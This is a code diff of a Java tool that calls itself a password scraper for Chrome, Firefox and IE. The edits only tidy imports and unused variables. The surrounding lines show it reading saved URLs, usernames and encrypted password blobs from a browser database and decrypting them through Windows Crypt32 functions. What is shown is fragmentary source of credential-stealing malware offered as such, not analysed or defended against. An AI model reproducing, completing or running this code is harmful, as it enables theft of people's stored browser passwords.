@@ -1,33 +1,21 @@
 import java.util.*;
-import java.lang.Object;
 
 import org.apache.commons.io.FileUtils;
 
-import com.sun.jna.*;
 import com.sun.jna.platform.win32.*;
-import com.sun.jna.platform.win32.WinCrypt.DATA_BLOB;
-
-import java.nio.file.*;
-import java.nio.file.attribute.*;
-import static java.nio.file.FileVisitResult.*;
-import static java.nio.file.FileVisitOption.*;
 
 import java.io.File;
-import java.io.FileNotFoundException;
+
 import java.io.IOException;
 import java.io.FileOutputStream;
-import java.io.InputStream;
 import java.io.PrintStream;
-import java.io.UnsupportedEncodingException;
 import java.sql.DriverManager;
 import java.sql.Connection;
 import java.sql.ResultSet;
-import java.sql.ResultSetMetaData;
 import java.sql.SQLException;
 import java.sql.Statement;
 
 // Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
-// 4th Year Project?
 
 public class jdec extends Crypt32Util {
 	
@@ -66,9 +54,6 @@ public class jdec extends Crypt32Util {
 		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
 		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
 	
-		ResultSetMetaData rsmeta = rsurls.getMetaData();
-		int numberofsets = rsmeta.getColumnCount();
-	
 		// URLs into String array
 		int urint = 0;
 		String[] urls = new String[cint];
@@ -98,8 +83,6 @@ public class jdec extends Crypt32Util {
 	
 		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
 		int x = 0;
-		boolean work;
-		Object NULL = null;
 	
 		// Decrypt data
 		while(x != cint) {
